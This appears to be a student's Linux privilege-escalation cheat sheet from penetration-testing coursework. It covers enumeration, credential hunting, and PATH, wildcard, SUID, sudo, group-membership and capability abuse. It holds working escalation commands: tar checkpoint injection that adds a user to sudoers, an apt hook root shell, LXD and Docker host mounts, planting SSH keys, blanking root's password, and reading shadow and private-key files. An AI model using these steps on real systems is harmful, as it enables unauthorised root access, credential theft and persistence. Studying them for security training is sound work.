# Linux Privilege Escalation

---

## Section I — Enumeration

**Tools:** `linenum` · `linpeas`

### Important Details to Check

- OS Version
- Kernel Version
- Running services

```bash
# Listing current process
ps aux | grep root
```

- Installed package and version
- Logged in users

```bash
# List current terminal-attached processes
ps au
```

- See user home directories / home folder that contain SSH keys

### Home Directories Contents

```bash
ls /home          # visible dirs
ls -la /home      # visible + hidden dirs
```

---

### 1. SSH Directories Content

```bash
ls -l ~/.ssh
```

```bash
history           # Bash history may contain passwords
sudo -l           # Sudo privileges
```

- Look at configuration files / shadow file → `.conf` · `.config`

```bash
cat /etc/passwd
ls -la /etc/cron.daily                                                    # Cron jobs
lsblk                                                                     # Unmounted File Systems and additional drives
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null              # Find writable directories
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null              # Find writable files
```

---

## Section II — System Basics

### Answers to Find

- What OS are we dealing with? Debian, Red Hat, Ubuntu

### Command Basics

```bash
whoami
id                  # verify group we belong to
hostname            # name of the server
ip a / ifconfig
sudo -l
```

### System Enumeration Commands

| Reference | Purpose | Command |
|-----------|---------|---------|
| a | Check OS | `cat /etc/os-release` |
| b | Check PATH | `echo $PATH` |
| c | Check environment variables | `env` |
| d | Check kernel version | `cat /proc/version \|\| uname -a` |
| e | CPU info | `lscpu` |
| f | Available/authorized login shells | `cat /etc/shells` |
| g | Block devices (HDD, USB, optical) | `lsblk` |
| h | Printers attached | `lpstat` |
| i | Mountable drives | `cat /etc/fstab` |
| j | Routing table | `route / netstat -rn` |
| k | Internal DNS | `cat /etc/resolv.conf` |
| l | All registered users | `cat /etc/passwd \|\| cat /etc/passwd \| cut -f1 -d:` |
| m | Existing groups | `cat /etc/group` |
| n | Members of a group | `getent group <group>` |
| o | Mounted file systems | `df -h` |
| q | Unmounted file systems | `cat /etc/fstab \| grep -v "#" \| column -t` |
| r | All hidden files | `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null` |
| s | All hidden directories | `find / -type d -name ".*" -ls 2>/dev/null` |
| t | Temporary files | `ls -l /tmp /var/tmp /dev/shm` |
| U | Search specific string pattern in file | `sudo grep -rEI "your_regex_here" / 2>/dev/null` |

### Hash Reference

| Type | Prefix |
|------|--------|
| Salted MD5 | `$1$...` |
| SHA-256 | `$5$...` |
| SHA-512 | `$6$...` |
| BCrypt | `$2a$...` |
| Scrypt | `$7$...` |
| Argon2 | `$argon2i$...` |

---

## Section III — Linux Services & Internal Enumeration

### Questions to Answer

- What services and applications are installed?
- What services are running?
- What sockets are in use?
- What users, admins, and groups exist on the system?
- Who is logged in? What users recently logged in?
- What are the password policies?
- Is the host joined to an Active Directory Domain?
- What type of info is interesting in log, history, or backup files?
- Which files have been modified recently?
- Current IP address
- `/etc/hosts` file
- Tools installed that we may take advantage of
- Access bash history; `ip a`; `ifconfig`

---

### A) Internals

> About the internal configuration

```bash
ip a                    # Network interfaces
cat /etc/hosts          # Hosts
lastlog                 # User last login
w                       # Logged in users
history                 # Command history

# Find history files
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

> `proc/procfs` is a filesystem that contains information about system processes

```bash
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

---

### B) Services

```bash
# Installed packages
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

# Sudo version
sudo -V
```

> It may happen that there are no direct packages installed on the system but these are called via binaries

```bash
ls -l /bin /usr/bin /usr/sbin
```

> **GTFObins** provides an excellent platform that includes a list of binaries that can potentially be exploited to escalate privileges

```bash
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i"; fi; done
```

> `strace` is a diagnostic tool on the OS to track and analyze system calls and signals processing. Allows us to understand the flow of a program and how it accesses system resources.

```bash
strace ping -c <IP_ADDRESS>
```

```bash
# Locate all configuration files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

# Locate all scripts
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

# Running servers by user
ps aux | grep root

# Locate binaries of specific program
ls /usr/bin/python*
```

---

## Section IV — Credential Hunting

> Credentials may be found in → `.conf` · `.config` · `.xml` · etc.

- `/var` directories usually contain web root and may contain database credentials

```bash
grep 'DB_USER\|DB_PASSWORD' wp-config.php

# Find configuration files
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

# Find SSH keys
ls ~/.ssh
```

---

## Section V — Path Abuse

> List of directories that the system searches when you type a command. Allows users to run a program (like `ls`, `python`) without typing the full path (`/bin/ls`, `/usr/sbin/python3.11`).
> Linux runs the **first match** it finds from **left to right**.

### Workflow Example

1. Identify a program that runs as root → e.g. `cat`
2. Create a malicious "fake" command in a writable directory → e.g. `/tmp/cat`
3. Manipulate PATH:

```bash
export PATH=/tmp:$PATH
# OR
PATH=.:$PATH; export PATH    # (. represents the directory we are working in)
```

4. Execute

---

## Section VI — Wildcard Abuse

> Characters that can be used as a replacement for other characters and are interpreted by the shell before other actions.

| Wildcard | Description |
|----------|-------------|
| `*` | Can match any number of characters in a filename |
| `?` | Matches a single character |
| `[]` | Matches any single character at the defined position |
| `~` | Refers to a user's home directory |
| `-` | — |

### Proof of Concept

#### 1. The Vulnerability

When a command (like `tar`, used for compression) uses a wildcard (`*`) in a directory where a user has write access, the shell expands that `*` into a list of all filenames in that folder. If a filename starts with a dash (e.g., `--checkpoint`), tar treats it as a command-line argument rather than a file.

#### 2. Exploitation Example

> If a root cron job runs: `tar -zcf backup.tar.gz *`

**Step 1: Create a malicious script (`root.sh`)**

This script contains the command you want root to run (e.g., adding yourself to sudoers).

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

**Step 2: Create "Argument" files**

Create empty files named exactly after the tar flags you want to inject:

```bash
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

**Step 3: The Execution**

When the cron job runs, the shell expands `*` to:

```bash
tar -zcf backup.tar.gz root.sh --checkpoint=1 --checkpoint-action=exec=sh root.sh
```

The `--checkpoint-action` flag tells tar to execute `root.sh` with root privileges.

---

## Section VII — Escaping Restricted Shell

> A restricted shell is a type of shell that limits a user's ability to execute commands.
> - May only allow certain commands or commands in certain directories.

**Examples:** `rbash`, `rksh`, `rzsh`
- External partners accessing email and file sharing may use: `rbash`
- Partners accessing database and web server may use: `rksh`

### Escaping Techniques

**Command Injection**

> Scenario: we are only allowed to use `ls`

```bash
# Bypass: pass another command as argument
ls -l "pwd"
```

**Command Chaining**

```bash
# Follow our payload after an authorized command
ls /home; whoami; pwd
```

```bash
# List available commands in rbash
compgen -c

# Make echo act as cat
echo "$(< flag.txt)"
```

---

## Section VIII — Special Permissions

> `setuid` permission can allow a user to execute a program with another user's privileges.

```bash
# Find all SUID files owned by root
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Find SUID and SGID owned by root and executable
find / -uid 0 -perm -6000 -type f 2>/dev/null

# Spawn root shell by exploiting apt configuration hook
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

---

## Section IX — Sudo Rights Abuse

```bash
sudo -l    # list our permissions
```

---

## Section X — Privileged Groups

### LXC / LXD

> **LXD** is similar to Docker.

If your user is in the **LXD group**, it means you are allowed to create and control containers on the system. Normally, containers are isolated, so even if you are root inside them, you are not root on the host. However, LXD has an option to create a **privileged container**, where this isolation is removed. In that case, root inside the container becomes real root on the host machine.

Once you have this privileged container, you can mount the host's entire filesystem (`/`) inside the container (e.g. at `/mnt/root`). Since you are root inside the container — and that root is actually the host's root — you can browse, read, and modify all files on the host system.

> **LXD group → create privileged container → mount host disk → become root on the real system**

#### Proof of Concept: LXD

```bash
# 1. Check if you have LXD rights
id
# Look for: lxd → means you can exploit

# 2. Load a minimal Linux image (Alpine)
unzip alpine.zip
cd 64-bit\ Alpine/
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

# 3. Create a privileged container (THIS is the key step)
lxc init alpine r00t -c security.privileged=true
# → makes container root = host root

# 4. Mount the host filesystem inside the container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
# → host "/" is now accessible at /mnt/root

# 5. Start container and get shell
lxc start r00t
lxc exec r00t /bin/sh

# 6. You are root → access host files
id
cd /mnt/root/root
```

---

### Docker

Being in the **Docker group** is basically the same as having root privileges because Docker allows you to create containers that can interact directly with the host system. By running a container and mounting sensitive host directories (like `/root` or `/etc`) into it, you can access or modify files as if you were root. Since Docker runs with elevated privileges, anyone in the `docker` group can abuse it to read sensitive data (like `/etc/shadow`) or inject SSH keys into `/root/.ssh`, effectively gaining full root access on the host.

> **Docker group → mount host folders → control them as root**

#### Proof of Concept: Docker

```bash
# 1. Check docker group
id

# 2. Run container and mount host root directory
docker run -v /root:/mnt -it ubuntu

# 3. Inside container → access host root
cd /mnt
ls

# Example: add SSH key for persistence
mkdir -p /mnt/.ssh
echo "YOUR_PUBLIC_KEY" >> /mnt/.ssh/authorized_keys
```

> 🎯 **Key takeaway:** Docker group = root because you can mount and control the host filesystem.

---

### Disk

Users in the **disk group** have direct access to raw disk devices like `/dev/sda`. This means they can bypass normal file permissions and read the entire filesystem directly using low-level tools like `debugfs`. Since this access ignores Linux permission controls, an attacker can extract sensitive files such as `/etc/shadow`, SSH keys, or any protected data, effectively gaining root-level access to the system's data.

> **Disk group → raw disk access → bypass permissions → read everything**

#### Proof of Concept: Disk

```bash
# 1. Check disk group
id

# 2. Use debugfs on main disk
debugfs /dev/sda1

# 3. Inside debugfs → read sensitive files
cat /etc/shadow
cat /root/.ssh/id_rsa
```

> 🎯 **Key takeaway:** Disk group = full filesystem access (no permission checks)

---

### ADM

Members of the **adm group** can read system logs in `/var/log`. This does not directly give root access, but logs often contain sensitive information such as credentials, command history, cron jobs, file paths, or error messages that reveal system behavior. By analyzing logs, an attacker can discover passwords, tokens, or misconfigurations that can later be used for privilege escalation.

> **ADM group → read logs → find secrets → escalate later**

#### Proof of Concept: ADM

```bash
# 1. Check adm group
id

# 2. Read logs
ls /var/log

# 3. Look for sensitive info
cat /var/log/auth.log
cat /var/log/syslog

# Search for passwords or interesting data
grep -i "password" /var/log/*
grep -i "cron" /var/log/*
```

---

## Section XI — Capabilities

> Security features in the Linux OS that allow specific processes to be granted some privileges, allowing them to perform tasks that would otherwise be restricted.

In Ubuntu this command is `setcap`:

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
# → the binary file will be able to bind to network ports; which is usually restricted
```

### Capability Descriptions

| Capability | Description |
|------------|-------------|
| `cap_sys_admin` | Allows performing actions with administrative privileges, such as modifying system files or changing system settings. |
| `cap_sys_chroot` | Allows changing the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible. |
| `cap_sys_ptrace` | Allows attaching to and debugging other processes, potentially allowing access to sensitive information or modification of other processes' behavior. |
| `cap_sys_nice` | Allows raising or lowering the priority of processes, potentially allowing access to resources that would otherwise be restricted. |
| `cap_sys_time` | Allows modifying the system clock, potentially allowing manipulation of timestamps or causing other processes to behave unexpectedly. |
| `cap_sys_resource` | Allows modifying system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated. |
| `cap_sys_module` | Allows loading and unloading kernel modules, potentially allowing modification of the OS's behavior or access to sensitive information. |
| `cap_net_bind_service` | Allows binding to network ports, potentially allowing access to sensitive information or performing unauthorized actions. |

### Capability Values

| Value | Description |
|-------|-------------|
| `=` | Sets the specified capability for the executable, but does not grant any privileges. Useful to clear a previously set capability. |
| `+ep` | Grants the effective and permitted privileges for the specified capability to the executable. |
| `+ei` | Grants sufficient and inheritable privileges for the specified capability to the executable. Child processes spawned by the executable inherit the capability. |
| `+p` | Grants the permitted privileges for the specified capability to the executable. Prevents inheriting the capability or allowing child processes to inherit it. |

### Capabilities That Allow Escalation to Root

| Capability | Description |
|------------|-------------|
| `cap_setuid` | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including root. |
| `cap_setgid` | Allows setting its effective group ID, which can be used to gain the privileges of another group, including root. |
| `cap_sys_admin` | Provides a broad range of administrative privileges, including many actions reserved for root. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks. |

### Capabilities Enumeration

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

### Exploitation

If a binary (like `vim`) has the `cap_dac_override` capability, it can bypass file permissions. This means even a low-privilege user can read/write protected files like `/etc/passwd`.

- `vim` is allowed to ignore permissions
- So you can edit `/etc/passwd`
- Remove the password for root
- Then log in as root without a password

> **`cap_dac_override` → ignore permissions → modify system files → become root**

```bash
# 1. Find binaries with dangerous capability
getcap /usr/bin/vim.basic
# Output: /usr/bin/vim.basic cap_dac_override=eip

# 2. Check root entry
cat /etc/passwd | head -n1
# Output: root:x:0:0:root:/root:/bin/bash

# 3. Edit passwd using vim (bypass permissions)
/usr/bin/vim.basic /etc/passwd
```

Change:
```
root:x:0:0:root:/root:/bin/bash
```
To:
```
root::0:0:root:/root:/bin/bash
```

```bash
# OR non-interactive exploit
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

# 4. Verify change
cat /etc/passwd | head -n1
# Output: root::0:0:root:/root:/bin/bash

# 5. Become root (no password needed)
su root
```

> 🎯 **Key takeaway:** `cap_dac_override` = bypass file permissions → edit sensitive files → root access

---

## Section XII — Vulnerable Services

> Check the version of services and if there are available PoCs that could potentially lead to privilege escalation.

---

## Section XIII — Cron Job Abuse

```bash
# Cron files are created in:
/var/spool/cron
```

> **pspy** → CLI tool that allows viewing running processes without being root

```bash
./pspy64 -pf -i 1000
# -pf  → print commands and file system events
# -i 1000 → every 1000ms
```

> Bash one-liner reverse shell: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

---

## Section XIV — Containers

- Operate at the virtual machine level
- Used to isolate a process from the rest of the system
- Different from classic virtualization, which allows multiple OS to run on the same system

### A) Linux Container (LXC)

LXC is an operating system level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host.

### B) Linux Daemon (LXD)

Similar to LXC but is designed to contain a complete operating system. Before we can exploit this we must confirm that we either belong to group `lxc` or `lxd`.

#### Proof of Concept: LXD (Daemon)

```bash
# 1. Import image
lxc image import <filename.tar.gz> --alias ubuntutemp
lxc image list

# 2. After image is successfully imported
lxc init ubuntutemp privesc -c security.privileged=true

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# 3. Access the container
lxc start privesc
lxc exec privesc /bin/bash
```
